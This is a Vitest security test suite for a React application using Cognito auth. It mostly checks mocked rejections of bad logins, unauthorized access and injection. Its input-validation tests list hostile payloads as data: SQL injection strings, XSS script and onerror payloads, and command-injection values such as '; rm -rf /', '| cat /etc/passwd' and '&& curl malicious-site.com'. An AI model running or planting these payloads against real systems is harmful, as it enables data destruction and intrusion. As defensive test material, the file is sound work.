/**
 * Security Testing Suite
 * Tests security aspects of the application including authentication, authorization, and data protection
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { renderHook, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createElement } from 'react';
import { useOrganization } from '@/hooks/useOrganization';
import {
  mockCognitoAuth,
  mockApiClient,
  mockUser,
  mockSession,
  simulateAuthError,
  createTestQueryClient,
} from '../setup/test-environment';

describe('Security Testing', () => {
  let queryClient: QueryClient;
  let wrapper: any;

  beforeEach(() => {
    queryClient = createTestQueryClient();
    wrapper = ({ children }: any) =>
      createElement(QueryClientProvider, { client: queryClient }, children);
  });

  describe('Authentication Security', () => {
    it('should reject invalid credentials', async () => {
      mockCognitoAuth.signIn.mockRejectedValue(new Error('Invalid credentials'));

      await expect(
        mockCognitoAuth.signIn('invalid@example.com', 'wrongpassword')
      ).rejects.toThrow('Invalid credentials');
    });

    it('should handle session expiration securely', async () => {
      // Mock expired session
      mockCognitoAuth.getCurrentSession.mockResolvedValue(null);
      mockCognitoAuth.getCurrentUser.mockResolvedValue(null);

      const { result } = renderHook(() => useOrganization(), { wrapper });

      await waitFor(() => {
        expect(result.current.isError).toBe(true);
        expect(result.current.error?.message).toBe('Not authenticated');
      });
    });

    it('should prevent session hijacking', async () => {
      const validSession = { ...mockSession, accessToken: 'valid-token' };
      const invalidSession = { ...mockSession, accessToken: 'hijacked-token' };

      // First request with valid session
      mockCognitoAuth.getCurrentSession.mockResolvedValueOnce(validSession);
      mockApiClient.rpc.mockResolvedValueOnce({ data: 'org-123', error: null });

      const { result } = renderHook(() => useOrganization(), { wrapper });
      await waitFor(() => expect(result.current.isSuccess).toBe(true));

      // Second request with hijacked session should fail
      mockCognitoAuth.getCurrentSession.mockResolvedValueOnce(invalidSession);
      mockApiClient.rpc.mockRejectedValueOnce(new Error('Invalid token'));

      result.current.refetch();

      await waitFor(() => {
        expect(result.current.isError).toBe(true);
      });
    });

    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'abc123',
        '12345678',
        'qwerty',
      ];

      for (const password of weakPasswords) {
        mockCognitoAuth.signUp.mockRejectedValue(
          new Error('Password does not meet requirements')
        );

        await expect(
          mockCognitoAuth.signUp('test@example.com', password, 'Test User')
        ).rejects.toThrow('Password does not meet requirements');
      }
    });

    it('should implement rate limiting for authentication attempts', async () => {
      const maxAttempts = 5;
      let attemptCount = 0;

      mockCognitoAuth.signIn.mockImplementation(async () => {
        attemptCount++;
        if (attemptCount > maxAttempts) {
          throw new Error('Too many failed attempts. Account temporarily locked.');
        }
        throw new Error('Invalid credentials');
      });

      // Simulate multiple failed attempts
      for (let i = 0; i < maxAttempts; i++) {
        await expect(
          mockCognitoAuth.signIn('test@example.com', 'wrongpassword')
        ).rejects.toThrow('Invalid credentials');
      }

      // Next attempt should be rate limited
      await expect(
        mockCognitoAuth.signIn('test@example.com', 'wrongpassword')
      ).rejects.toThrow('Too many failed attempts');
    });
  });

  describe('Authorization and Access Control', () => {
    it('should enforce organization-based data isolation', async () => {
      const user1 = { ...mockUser, organizationId: 'org-1' };
      const user2 = { ...mockUser, organizationId: 'org-2' };

      // User 1 should only access org-1 data
      mockCognitoAuth.getCurrentUser.mockResolvedValueOnce(user1);
      mockApiClient.rpc.mockResolvedValueOnce({ data: 'org-1', error: null });

      const { result: result1 } = renderHook(() => useOrganization(), { wrapper });
      await waitFor(() => expect(result1.current.data).toBe('org-1'));

      // User 2 should only access org-2 data
      mockCognitoAuth.getCurrentUser.mockResolvedValueOnce(user2);
      mockApiClient.rpc.mockResolvedValueOnce({ data: 'org-2', error: null });

      const { result: result2 } = renderHook(() => useOrganization(), { wrapper });
      await waitFor(() => expect(result2.current.data).toBe('org-2'));

      // Verify isolation
      expect(result1.current.data).not.toBe(result2.current.data);
    });

    it('should prevent unauthorized API access', async () => {
      simulateAuthError();

      mockApiClient.select.mockResolvedValue({
        data: null,
        error: { message: 'Unauthorized', status: 401 },
      });

      const result = await mockApiClient.select('sensitive_data', {});

      expect(result.error?.status).toBe(401);
      expect(result.error?.message).toBe('Unauthorized');
      expect(result.data).toBeNull();
    });

    it('should validate user permissions for sensitive operations', async () => {
      const restrictedOperations = [
        'delete_organization',
        'modify_billing',
        'access_audit_logs',
        'manage_users',
      ];

      for (const operation of restrictedOperations) {
        mockApiClient.invoke.mockResolvedValue({
          data: null,
          error: { message: 'Insufficient permissions', status: 403 },
        });

        const result = await mockApiClient.invoke(operation, {});

        expect(result.error?.status).toBe(403);
        expect(result.error?.message).toBe('Insufficient permissions');
      }
    });

    it('should prevent privilege escalation', async () => {
      const regularUser = { ...mockUser, role: 'user' };
      const adminOperation = 'admin_only_function';

      mockCognitoAuth.getCurrentUser.mockResolvedValue(regularUser);
      mockApiClient.invoke.mockResolvedValue({
        data: null,
        error: { message: 'Admin access required', status: 403 },
      });

      const result = await mockApiClient.invoke(adminOperation, {});

      expect(result.error?.status).toBe(403);
      expect(result.error?.message).toBe('Admin access required');
    });
  });

  describe('Data Protection and Privacy', () => {
    it('should sanitize sensitive data in responses', async () => {
      const sensitiveData = {
        id: 'user-123',
        email: 'test@example.com',
        password: 'should-not-be-returned',
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111',
        apiKey: 'secret-api-key',
      };

      mockApiClient.select.mockResolvedValue({
        data: [
          {
            id: sensitiveData.id,
            email: sensitiveData.email,
            // Sensitive fields should be filtered out
          },
        ],
        error: null,
      });

      const result = await mockApiClient.select('users', {});

      expect(result.data?.[0]).toHaveProperty('id');
      expect(result.data?.[0]).toHaveProperty('email');
      expect(result.data?.[0]).not.toHaveProperty('password');
      expect(result.data?.[0]).not.toHaveProperty('ssn');
      expect(result.data?.[0]).not.toHaveProperty('creditCard');
      expect(result.data?.[0]).not.toHaveProperty('apiKey');
    });

    it('should encrypt sensitive data in transit', async () => {
      // Mock HTTPS enforcement
      const originalLocation = window.location;
      delete (window as any).location;
      window.location = { ...originalLocation, protocol: 'https:' };

      // Verify HTTPS is enforced
      expect(window.location.protocol).toBe('https:');

      // Restore original location
      window.location = originalLocation;
    });

    it('should implement proper data retention policies', async () => {
      const expiredData = {
        id: 'expired-123',
        createdAt: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000).toISOString(), // 1 year ago
        retentionPeriod: 180, // 180 days
      };

      mockApiClient.select.mockResolvedValue({
        data: [], // Expired data should not be returned
        error: null,
      });

      const result = await mockApiClient.select('expired_table', {});

      expect(result.data).toEqual([]);
    });

    it('should prevent data leakage through error messages', async () => {
      mockApiClient.select.mockResolvedValue({
        data: null,
        error: {
          message: 'Access denied', // Generic error message
          // Should not contain: "User john@example.com does not have access to table sensitive_data"
        },
      });

      const result = await mockApiClient.select('sensitive_table', {});

      expect(result.error?.message).toBe('Access denied');
      expect(result.error?.message).not.toContain('@');
      expect(result.error?.message).not.toContain('table');
      expect(result.error?.message).not.toContain('sensitive');
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should prevent SQL injection attacks', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/*",
        "1; DELETE FROM users WHERE 1=1; --",
      ];

      for (const maliciousInput of maliciousInputs) {
        mockApiClient.select.mockResolvedValue({
          data: null,
          error: { message: 'Invalid input detected' },
        });

        const result = await mockApiClient.select('users', {
          eq: { id: maliciousInput },
        });

        expect(result.error?.message).toBe('Invalid input detected');
        expect(result.data).toBeNull();
      }
    });

    it('should prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
      ];

      for (const payload of xssPayloads) {
        mockApiClient.insert.mockResolvedValue({
          data: null,
          error: { message: 'Invalid content detected' },
        });

        const result = await mockApiClient.insert('articles', {
          title: payload,
          content: 'Test content',
        });

        expect(result.error?.message).toBe('Invalid content detected');
        expect(result.data).toBeNull();
      }
    });

    it('should validate input length and format', async () => {
      const invalidInputs = [
        { email: 'not-an-email' },
        { email: 'a'.repeat(1000) + '@example.com' }, // Too long
        { phone: '123' }, // Too short
        { phone: 'not-a-phone' }, // Invalid format
      ];

      for (const input of invalidInputs) {
        mockApiClient.insert.mockResolvedValue({
          data: null,
          error: { message: 'Validation failed' },
        });

        const result = await mockApiClient.insert('users', input);

        expect(result.error?.message).toBe('Validation failed');
        expect(result.data).toBeNull();
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl malicious-site.com',
        '`whoami`',
      ];

      for (const payload of commandInjectionPayloads) {
        mockApiClient.invoke.mockResolvedValue({
          data: null,
          error: { message: 'Invalid command detected' },
        });

        const result = await mockApiClient.invoke('system-command', {
          command: payload,
        });

        expect(result.error?.message).toBe('Invalid command detected');
        expect(result.data).toBeNull();
      }
    });
  });

  describe('Session Management Security', () => {
    it('should implement secure session timeout', async () => {
      const expiredSession = {
        ...mockSession,
        expiresAt: new Date(Date.now() - 1000).toISOString(), // Expired 1 second ago
      };

      mockCognitoAuth.getCurrentSession.mockResolvedValue(null); // Session expired

      const { result } = renderHook(() => useOrganization(), { wrapper });

      await waitFor(() => {
        expect(result.current.isError).toBe(true);
        expect(result.current.error?.message).toBe('Not authenticated');
      });
    });

    it('should invalidate sessions on logout', async () => {
      mockCognitoAuth.signOut.mockResolvedValue(undefined);
      mockCognitoAuth.getCurrentSession.mockResolvedValue(null);

      await mockCognitoAuth.signOut();

      const session = await mockCognitoAuth.getCurrentSession();
      expect(session).toBeNull();
    });

    it('should prevent concurrent sessions for same user', async () => {
      const session1 = { ...mockSession, sessionId: 'session-1' };
      const session2 = { ...mockSession, sessionId: 'session-2' };

      // First session is valid
      mockCognitoAuth.getCurrentSession.mockResolvedValueOnce(session1);
      
      // Second session should invalidate first
      mockCognitoAuth.getCurrentSession.mockResolvedValueOnce(session2);
      
      // First session should now be invalid
      mockCognitoAuth.getCurrentSession.mockResolvedValueOnce(null);

      const firstSession = await mockCognitoAuth.getCurrentSession();
      expect(firstSession?.sessionId).toBe('session-1');

      const secondSession = await mockCognitoAuth.getCurrentSession();
      expect(secondSession?.sessionId).toBe('session-2');

      const invalidatedSession = await mockCognitoAuth.getCurrentSession();
      expect(invalidatedSession).toBeNull();
    });
  });

  describe('API Security', () => {
    it('should implement proper CORS policies', async () => {
      const allowedOrigins = [
        'https://app.evo-uds.com',
        'https://staging.evo-uds.com',
      ];

      const blockedOrigins = [
        'https://malicious-site.com',
        'http://localhost:3000', // HTTP not allowed
        'https://evil.com',
      ];

      // Mock CORS validation
      for (const origin of allowedOrigins) {
        mockApiClient.select.mockResolvedValue({ data: [], error: null });
        const result = await mockApiClient.select('test', {});
        expect(result.error).toBeNull();
      }

      for (const origin of blockedOrigins) {
        mockApiClient.select.mockResolvedValue({
          data: null,
          error: { message: 'CORS policy violation', status: 403 },
        });
        const result = await mockApiClient.select('test', {});
        expect(result.error?.status).toBe(403);
      }
    });

    it('should validate API request signatures', async () => {
      const validSignature = 'valid-hmac-signature';
      const invalidSignature = 'invalid-signature';

      // Valid signature should work
      mockApiClient.invoke.mockResolvedValue({ data: { success: true }, error: null });
      const validResult = await mockApiClient.invoke('secure-endpoint', {
        headers: { 'X-Signature': validSignature },
      });
      expect(validResult.error).toBeNull();

      // Invalid signature should fail
      mockApiClient.invoke.mockResolvedValue({
        data: null,
        error: { message: 'Invalid signature', status: 401 },
      });
      const invalidResult = await mockApiClient.invoke('secure-endpoint', {
        headers: { 'X-Signature': invalidSignature },
      });
      expect(invalidResult.error?.status).toBe(401);
    });

    it('should implement request rate limiting', async () => {
      const rateLimitExceeded = {
        data: null,
        error: { message: 'Rate limit exceeded', status: 429 },
      };

      // Simulate rate limit after multiple requests
      mockApiClient.select
        .mockResolvedValueOnce({ data: [], error: null })
        .mockResolvedValueOnce({ data: [], error: null })
        .mockResolvedValueOnce({ data: [], error: null })
        .mockResolvedValue(rateLimitExceeded);

      // First few requests should work
      for (let i = 0; i < 3; i++) {
        const result = await mockApiClient.select('test', {});
        expect(result.error).toBeNull();
      }

      // Subsequent requests should be rate limited
      const rateLimitedResult = await mockApiClient.select('test', {});
      expect(rateLimitedResult.error?.status).toBe(429);
    });
  });

  describe('Audit and Monitoring', () => {
    it('should log security events', async () => {
      const securityEvents = [];

      // Mock security event logging
      const logSecurityEvent = (event: any) => {
        securityEvents.push({
          ...event,
          timestamp: new Date().toISOString(),
        });
      };

      // Simulate failed login
      mockCognitoAuth.signIn.mockRejectedValue(new Error('Invalid credentials'));
      
      try {
        await mockCognitoAuth.signIn('test@example.com', 'wrongpassword');
      } catch (error) {
        logSecurityEvent({
          type: 'FAILED_LOGIN',
          email: 'test@example.com',
          error: error.message,
        });
      }

      expect(securityEvents).toHaveLength(1);
      expect(securityEvents[0].type).toBe('FAILED_LOGIN');
      expect(securityEvents[0].email).toBe('test@example.com');
    });

    it('should detect suspicious activity patterns', async () => {
      const suspiciousActivities = [];

      // Mock suspicious activity detection
      const detectSuspiciousActivity = (activity: any) => {
        const patterns = [
          'multiple_failed_logins',
          'unusual_access_pattern',
          'privilege_escalation_attempt',
        ];

        if (patterns.some(pattern => activity.type.includes(pattern))) {
          suspiciousActivities.push(activity);
        }
      };

      // Simulate multiple failed logins
      for (let i = 0; i < 10; i++) {
        detectSuspiciousActivity({
          type: 'multiple_failed_logins',
          userId: 'user-123',
          timestamp: new Date().toISOString(),
        });
      }

      expect(suspiciousActivities).toHaveLength(10);
    });

    it('should maintain audit trail for sensitive operations', async () => {
      const auditTrail = [];

      const auditSensitiveOperation = (operation: any) => {
        auditTrail.push({
          ...operation,
          timestamp: new Date().toISOString(),
          userId: mockUser.id,
          organizationId: mockUser.organizationId,
        });
      };

      // Simulate sensitive operations
      const sensitiveOps = [
        { type: 'DELETE_USER', targetUserId: 'user-456' },
        { type: 'MODIFY_PERMISSIONS', targetUserId: 'user-789' },
        { type: 'ACCESS_AUDIT_LOGS', query: 'security_events' },
      ];

      sensitiveOps.forEach(auditSensitiveOperation);

      expect(auditTrail).toHaveLength(3);
      auditTrail.forEach(entry => {
        expect(entry).toHaveProperty('timestamp');
        expect(entry).toHaveProperty('userId');
        expect(entry).toHaveProperty('organizationId');
      });
    });
  });
});